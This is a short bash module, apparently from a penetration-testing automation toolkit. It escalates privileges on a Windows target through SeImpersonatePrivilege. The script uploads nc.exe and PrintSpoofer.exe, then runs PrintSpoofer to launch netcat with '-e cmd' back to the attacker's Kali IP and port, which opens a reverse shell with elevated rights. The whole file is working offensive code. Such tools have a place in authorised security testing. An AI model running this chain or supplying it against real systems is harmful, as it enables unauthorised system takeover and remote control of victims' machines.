#!/bin/bash

: '
CMD: PrintSpoofer: Reverse shell using SeImpersonatePrivilege.
'

# https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeImpersonatePrivilege.md

# Generate GUI form items (label, type (optional: default text), name, default (optional))
SHELL_PORT_FIELD=$(form_item  "shell port" "number" "shell_port" "1337")
PYTHON_HTTP_PORT_FIELD=$(form_item "Python HTTP port" "number" "python_http_port" "1234")

# Generate GUI form
generate_form "${SHELL_PORT_FIELD}" "${PYTHON_HTTP_PORT_FIELD}"

SHELL_PORT=${form_data["shell_port"]}
PYTHON_HTTP_PORT=${form_data["python_http_port"]}

ACTIVE_CRED_SYSTEM["python_http_port"]="${PYTHON_HTTP_PORT}"

LOCATION="${SCRIPTS_DIR}/fileTransfer/windows/.binaries"
FILE="nc.exe"

cmd_upload_file "${LOCATION}" "${FILE}"
NC_FILE_LOCATION="${FILE_LOCATION}"
sleep 3

LOCATION="${SCRIPTS_DIR}/fileTransfer/windows/.binaries"
FILE="PrintSpoofer.exe"

cmd_upload_file "${LOCATION}" "${FILE}"
PRINTSPOOFER_FILE_LOCATION="${FILE_LOCATION}"
sleep 3

execute_command "${PRINTSPOOFER_FILE_LOCATION} -c \"${NC_FILE_LOCATION} ${KALI_IP} ${SHELL_PORT} -e cmd\""
create_new_line
